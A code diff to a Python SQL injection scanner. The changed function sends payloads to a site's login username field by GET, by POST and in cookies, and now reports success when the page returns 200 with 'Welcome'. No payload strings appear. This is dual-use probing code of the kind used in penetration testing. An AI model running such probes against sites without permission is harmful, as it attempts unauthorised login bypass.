@@ -167,10 +167,11 @@ def test_sql_injection_payloads(url, payloads, method):
                 try:
                     response = requests.get(f"{url}?username={payload}&password=dummy")
 
-                    if 'Login failed' not in response.text:
-                        print_success(f"Payload: {payload} - SQL Injection (Method 1) - Vulnerable")
+                    # Check for indicators of successful SQL injection
+                    if response.status_code == 200 and 'Welcome' in response.text:
+                        print_success(f"URL: {url} - Payload: {payload} - SQL Injection (Method 1) - Vulnerable")
                     else:
-                        print_warning(f"Payload: {payload} - Not Vulnerable (Method 1)")
+                        print_warning(f"URL: {url} - Payload: {payload} - Not Vulnerable (Method 1)")
 
                 except requests.exceptions.RequestException as e:
                     print_error(f"Error (requests): {e}")
@@ -183,10 +184,11 @@ def test_sql_injection_payloads(url, payloads, method):
                     data = {'username': payload, 'password': 'dummy'}  # Adjust data fields as per the form
                     response = requests.post(url, data=data)
 
-                    if 'Login failed' not in response.text:
-                        print_success(f"Payload: {payload} - SQL Injection (Method 2) - Vulnerable")
+                    # Check for indicators of successful SQL injection
+                    if response.status_code == 200 and 'Welcome' in response.text:
+                        print_success(f"URL: {url} - Payload: {payload} - SQL Injection (Method 2) - Vulnerable")
                     else:
-                        print_warning(f"Payload: {payload} - Not Vulnerable (Method 2)")
+                        print_warning(f"URL: {url} - Payload: {payload} - Not Vulnerable (Method 2)")
 
                 except requests.exceptions.RequestException as e:
                     print_error(f"Error (requests): {e}")
@@ -196,13 +198,14 @@ def test_sql_injection_payloads(url, payloads, method):
             for payload in payloads:
                 payload = payload.strip()  # Remove leading/trailing whitespaces and newlines
                 try:
-                    cookies = {'username': payload, 'password': payload}  # Adjust cookie names as per the website
+                    cookies = {'username': payload, 'password': 'dummy'}  # Adjust cookie names as per the website
                     response = requests.get(url, cookies=cookies)
 
-                    if 'Login failed' not in response.text:
-                        print_success(f"Payload: {payload} - SQL Injection (Method 3) - Vulnerable")
+                    # Check for indicators of successful SQL injection
+                    if response.status_code == 200 and 'Welcome' in response.text:
+                        print_success(f"URL: {url} - Payload: {payload} - SQL Injection (Method 3) - Vulnerable")
                     else:
-                        print_warning(f"Payload: {payload} - Not Vulnerable (Method 3)")
+                        print_warning(f"URL: {url} - Payload: {payload} - Not Vulnerable (Method 3)")
 
                 except requests.exceptions.RequestException as e:
                     print_error(f"Error (requests): {e}")
